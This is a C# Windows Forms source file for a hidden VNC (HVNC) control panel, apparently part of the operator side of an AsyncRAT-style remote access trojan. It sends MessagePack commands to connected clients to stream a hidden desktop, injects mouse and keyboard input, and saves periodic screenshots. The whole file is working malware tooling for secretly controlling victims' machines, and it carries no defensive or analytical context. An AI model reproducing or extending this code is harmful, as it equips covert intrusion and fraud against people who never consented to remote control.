using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using System.Threading;
using System.Drawing.Imaging;
using System.IO;
using Encoder = System.Drawing.Imaging.Encoder;
using Server.StreamLibrary;

namespace Server.Forms
{
    public partial class FormHVNC : Form
    {
        public Form1 F { get; set; }
        internal Clients ParentClient { get; set; }
        internal Clients Client { get; set; }
        public string FullPath { get; set; }

        public int FPS = 0;
        public Stopwatch sw = Stopwatch.StartNew();
        public UnsafeStreamCodec decoder = new UnsafeStreamCodec(60);
        private bool isMouse = false;
        private bool isKeyboard = false;
        public object syncPicbox = new object();
        private readonly List<Keys> _keysPressed;
        public Image GetImage { get; set; }
        public FormHVNC()
        {
            _keysPressed = new List<Keys>();
            InitializeComponent();
        }


        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) this.Close();
            }
            catch { this.Close(); }
        }

        private void btnSlide_Click(object sender, EventArgs e)
        {
            if (panel1.Visible == false)
            {
                panel1.Visible = true;
                btnSlide.Top = panel1.Bottom + 5;
                btnSlide.BackgroundImage = Properties.Resources.arrow_up;
            }
            else
            {
                panel1.Visible = false;
                btnSlide.Top = pictureBox1.Top + 5;
                btnSlide.BackgroundImage = Properties.Resources.arrow_down;
            }
        }

        private void FormRemoteDesktop_Load(object sender, EventArgs e)
        {
            try
            {
                btnSlide.Top = panel1.Bottom + 5;
                btnSlide.Left = pictureBox1.Width / 2;
                btnStart.Tag = (object)"stop";
                btnSlide.PerformClick();
            }
            catch { }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (btnStart.Tag == (object)"play")
            {
                if (Client == null)
                {
                    MessageBox.Show("No client attached yet. Wait until the client stream connects.", "HVNC", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "hvnc";
                msgpack.ForcePathObject("Option").AsString = "capture";
                msgpack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value.ToString());
                msgpack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(numericUpDown2.Value.ToString());
                decoder = new UnsafeStreamCodec(Convert.ToInt32(numericUpDown1.Value));

                // capture bytes once and queue a safe lambda that checks the instance at execution time
                byte[] payload = msgpack.Encode2Bytes();
                Clients targetClient = Client; // capture current reference
                ThreadPool.QueueUserWorkItem(state =>
                {
                    try
                    {
                        targetClient?.Send(state);
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine(ex.Message);
                    }
                }, payload);

                numericUpDown1.Enabled = false;
                numericUpDown2.Enabled = false;
                btnSave.Enabled = true;
                btnMouse.Enabled = true;
                btnStart.Tag = (object)"stop";
                btnStart.BackgroundImage = Properties.Resources.stop__1_;
            }
            else
            {
                btnStart.Tag = (object)"play";
                try
                {
                    if (Client != null)
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "hvnc";
                        msgpack.ForcePathObject("Option").AsString = "stop";
                        byte[] payload = msgpack.Encode2Bytes();
                        Clients targetClient = Client;
                        ThreadPool.QueueUserWorkItem(state =>
                        {
                            try { targetClient?.Send(state); } catch { }
                        }, payload);
                    }
                }
                catch { }
                numericUpDown1.Enabled = true;
                numericUpDown2.Enabled = true;
                btnSave.Enabled = false;
                btnMouse.Enabled = false;
                btnStart.BackgroundImage = Properties.Resources.play_button;
            }
        }

        private void FormRemoteDesktop_ResizeEnd(object sender, EventArgs e)
        {
            btnSlide.Left = pictureBox1.Width / 2;
        }

        private void BtnSave_Click(object sender, EventArgs e)
        {
            if (btnStart.Tag == (object)"stop")
            {
                if (timerSave.Enabled)
                {
                    timerSave.Stop();
                    btnSave.BackgroundImage = Properties.Resources.save_image;
                }
                else
                {
                    timerSave.Start();
                    btnSave.BackgroundImage = Properties.Resources.save_image2;
                    try
                    {
                        if (!Directory.Exists(FullPath))
                            Directory.CreateDirectory(FullPath);
                        Process.Start(FullPath);
                    }
                    catch { }
                }
            }
        }

        private void TimerSave_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(FullPath))
                    Directory.CreateDirectory(FullPath);
                Encoder myEncoder = Encoder.Quality;
                EncoderParameters myEncoderParameters = new EncoderParameters(1);
                EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, 50L);
                myEncoderParameters.Param[0] = myEncoderParameter;
                ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                pictureBox1.Image.Save(FullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg", jpgEncoder, myEncoderParameters);
                myEncoderParameters?.Dispose();
                myEncoderParameter?.Dispose();
            }
            catch { }
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            try
            {
                if (btnStart.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
                {
                    int button = 0;
                    if (e.Button == MouseButtons.Left)
                        button = 2;
                    if (e.Button == MouseButtons.Right)
                        button = 8;

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "hvnc";
                    msgpack.ForcePathObject("Option").AsString = "mouseClick";
                    msgpack.ForcePathObject("X").AsInteger = e.X * decoder.Resolution.Width / pictureBox1.Width;
                    msgpack.ForcePathObject("Y").AsInteger = e.Y * decoder.Resolution.Height / pictureBox1.Height;
                    msgpack.ForcePathObject("Button").AsInteger = button;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            try
            {
                if (btnStart.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
                {
                    int button = 0;
                    if (e.Button == MouseButtons.Left)
                        button = 4;
                    if (e.Button == MouseButtons.Right)
                        button = 16;

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "hvnc";
                    msgpack.ForcePathObject("Option").AsString = "mouseClick";
                    msgpack.ForcePathObject("X").AsInteger = e.X * decoder.Resolution.Width / pictureBox1.Width;
                    msgpack.ForcePathObject("Y").AsInteger = e.Y * decoder.Resolution.Height / pictureBox1.Height;
                    msgpack.ForcePathObject("Button").AsInteger = button;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void pictureBox1_MouseEnter(object sender, EventArgs e)
        {
            pictureBox1.Focus();
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            try
            {
                if (pictureBox1.Image != null && this.ContainsFocus && isMouse)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "hvnc";
                    msgpack.ForcePathObject("Option").AsString = "mouseMove";
                    msgpack.ForcePathObject("X").AsInteger = e.X * decoder.Resolution.Width / pictureBox1.Width;
                    msgpack.ForcePathObject("Y").AsInteger = e.Y * decoder.Resolution.Height / pictureBox1.Height;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            isMouse = !isMouse;
            btnMouse.BackgroundImage = isMouse ? Properties.Resources.mouse_enable : Properties.Resources.mouse;
            UpdateCursorClip();
            pictureBox1.Focus();
        }

        private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                GetImage?.Dispose();
                ThreadPool.QueueUserWorkItem((o) =>
                {
                    Client?.Disconnected();
                });
            }
            catch { }
        }

        private void btnKeyboard_Click(object sender, EventArgs e)
        {
            if (isKeyboard)
            {
                isKeyboard = false;
                btnKeyboard.BackgroundImage = Properties.Resources.keyboard;
            }
            else
            {
                isKeyboard = true;
                btnKeyboard.BackgroundImage = Properties.Resources.keyboard_on;
            }
            pictureBox1.Focus();
        }

        private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
        {
            if (btnStart.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isKeyboard)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                if (_keysPressed.Contains(e.KeyCode))
                    return;

                _keysPressed.Add(e.KeyCode);

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "hvnc";
                msgpack.ForcePathObject("Option").AsString = "keyboardClick";
                msgpack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
                msgpack.ForcePathObject("keyIsDown").SetAsBoolean(true);
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }

        private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
        {
            if (btnStart.Tag == (object)"stop" && pictureBox1.Image != null && this.ContainsFocus && isKeyboard)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                _keysPressed.Remove(e.KeyCode);

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "hvnc";
                msgpack.ForcePathObject("Option").AsString = "keyboardClick";
                msgpack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
                msgpack.ForcePathObject("keyIsDown").SetAsBoolean(false);
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }

        private bool IsLockKey(Keys key)
        {
            return ((key & Keys.CapsLock) == Keys.CapsLock)
                   || ((key & Keys.NumLock) == Keys.NumLock)
                   || ((key & Keys.Scroll) == Keys.Scroll);
        }

        private void UpdateCursorClip()
        {
            if (isMouse)
                Cursor.Clip = pictureBox1.RectangleToScreen(pictureBox1.ClientRectangle);
            else
                Cursor.Clip = Rectangle.Empty; // release clipping
        }

    }
}
